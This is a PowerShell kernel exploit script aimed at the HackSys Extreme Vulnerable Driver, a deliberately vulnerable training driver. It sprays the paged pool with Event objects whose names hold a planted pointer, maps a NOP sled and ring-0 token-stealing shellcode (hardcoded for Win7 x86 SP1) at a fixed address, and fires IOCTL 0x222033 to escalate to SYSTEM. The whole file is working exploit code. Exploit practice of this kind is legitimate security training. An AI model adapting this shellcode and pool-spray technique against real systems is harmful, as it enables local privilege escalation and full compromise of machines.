Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
  
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
        IntPtr hObject);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreateEventW(
        IntPtr lpEventAttributes,
        Byte  bManualReset,
        Byte bInitialState,
		[MarshalAs(UnmanagedType.LPStr)]
        String lpName);
         
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DebugBreak();
}
"@

# Generate random ASCII buffer
function Random-232 {
	$Seed = 1..232|ForEach-Object{Get-Random -max 62};
	$CharSet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	$CharSet[$Seed] -join ""
}

function Event-PoolSpray {
	echo "[+] Allocating 256 unique Event names.."
	$Spray = @()
	for ($i=0;$i -lt 256;$i++) {
		# Paged pool => Object Name (ObNm)
		# 0x8 (header) + 0xf0 (string) = 0xf8
		$CallResult = [EVD]::CreateEventW([System.IntPtr]::Zero, 0, 0, $("JUNK"+ $([char[]]@(0x01,0x01,0x01,0x0c) -join "") + $(Random-232)))
		if ($CallResult -ne 0) {
			$Spray += $CallResult
		}
	}
	$Script:Event_hArray += $Spray
	
	echo "[?] Free all the things.."
	for ($i=0;$i -lt $($Event_hArray.Length);$i++) {
		$CallResult = [EVD]::CloseHandle($Event_hArray[$i])
		if ($CallResult -ne 0) {
			$FreeCount += 1
		}
	}
	echo "[+] Free'd $FreeCount event objects!"
}

$heap = @"

[*] ..I thought what I'd do was
      I'd pretend to be a heap var ..
"@
$heap

$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
  
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}

# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode =
	[Byte[]](0x90)*280 +                # NOP-sled 0x0c010000 -> 0x0c010101
	[Byte[]] @(
    #---[Setup]
    0x60,                               # pushad
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
    #---[Copy System PID token]
    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
    0x75, 0xED,                         # jnz                           ->|
    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
    #---[Recover]
    0x61,                               # popad
    0xC3                                # ret
)
 
# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([IntPtr]0x0c010000, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
#$ShellcodePointer = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"

echo "`n[?] Tainting lookaside.."
Event-PoolSpray
 
$Buffer = [System.BitConverter]::GetBytes(0xdeadb33f)
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x222033`n"
[EVD]::DeviceIoControl($hDevice, 0x222033, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null